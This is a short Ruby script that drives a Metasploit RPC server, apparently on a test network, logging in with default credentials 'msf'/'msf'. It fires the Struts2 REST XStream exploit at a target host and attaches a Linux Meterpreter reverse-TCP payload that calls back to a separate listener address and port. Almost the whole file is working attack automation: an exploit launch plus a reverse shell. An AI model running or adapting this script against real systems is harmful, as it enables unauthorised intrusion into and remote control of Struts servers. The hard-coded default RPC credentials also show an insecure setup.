require 'msfrpc-client'

user = 'msf'
pass = 'msf'

opts = {
  host: '172.17.0.2',
  port: 55553,
  uri:  '/api/',
  ssl:  false
}
rpc = Msf::RPC::Client.new(opts)
rpc.login(user, pass)
puts rpc
puts rpc.call('core.version')
puts rpc.call('core.module_stats')

# info exploit/multi/http/struts2_rest_xstream
# puts rpc.call('module.options', 'exploit', 'multi/http/struts2_rest_xstream')

exp_opts = {
  'RHOST'     => '10.6.223.122',
  'RPORT'     => 80,
  'verbose'   => true
}
pay_opts = {
  'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp',
  'LHOST'   => '10.6.210.117',
  'LPORT'   => 9911
}
job = rpc.call('module.execute', 'exploit', 'multi/http/struts2_rest_xstream', exp_opts.merge(pay_opts))
puts job['job_id']
puts rpc.call('job.info', job['job_id'])
